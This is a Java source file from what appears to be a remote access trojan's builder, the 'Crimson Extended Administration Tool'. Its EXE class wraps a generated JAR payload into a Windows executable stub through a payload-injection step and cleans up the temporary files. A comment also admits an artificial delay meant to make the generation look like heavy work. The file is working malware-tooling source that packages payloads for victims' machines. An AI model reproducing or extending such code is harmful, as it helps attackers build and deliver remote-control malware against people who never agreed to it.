package subterranean.crimson.server.generation;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 */

import java.io.File;
import java.util.ArrayList;
import java.util.Date;

import subterranean.crimson.server.ServerUtilities;
import subterranean.crimson.server.graphics.BackgroundProgressLights;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Path;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Options;

public class EXE extends Generator {

	public EXE(Options opt, String string, String string2, long l) {
		options = opt;
		outPath = new Path(string, string2);
		report = new ArrayList<String[]>();
		report.add(new String[] { "Generated:", "Windows EXE File" });
		report.add(new String[] { "Output Location:", outPath.getAbsolutePath() });

	}

	public void run() {
		BackgroundProgressLights.start("Generating EXE Payload");
		Date d1 = new Date();
		String ERROR = "UNKNOWN";
		Boolean suc = true;
		try {// to make sure the status lights turn off
			try {
				// make it seem like were doing some intense things
				Thread.sleep(2500);
			} catch (InterruptedException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}

			// write the exe
			File exe = new File(outPath.getAbsolutePath());

			byte[] file = Utilities.getFileInJar("/subterranean/crimson/server/plugins/exe/payload.exe");
			if (file == null) {
				// couldnt read the exe
				Logger.add("Couldnt read the EXE");
				ERROR = "The EXE Plugin is not installed.";
				suc = false;

				return;
			}
			Utilities.write(file, exe);

			// write a payload to temp
			File root = Utilities.getTempDir();
			Path temp = new Path(root.getAbsolutePath() + "/temp.jar");
			JAR p = new JAR(options, temp, 0);
			p.run();

			// inject the payload
			ServerUtilities.injectPayload(new File(root.getAbsolutePath() + "/temp.jar"), exe);

			// dereference
			exe = null;

			// delete the temporary jar
			Utilities.delete(root);

		} finally {
			Date d2 = new Date();
			// compare the dates
			double time = (d2.getTime() - d1.getTime()) / 1000.0;

			report.add(new String[] { "Generation Time:", time + " seconds" });

			if (suc) {
				success();
			} else {
				failure(ERROR);

			}

			BackgroundProgressLights.stop("Generating EXE Payload");

		}

	}

}
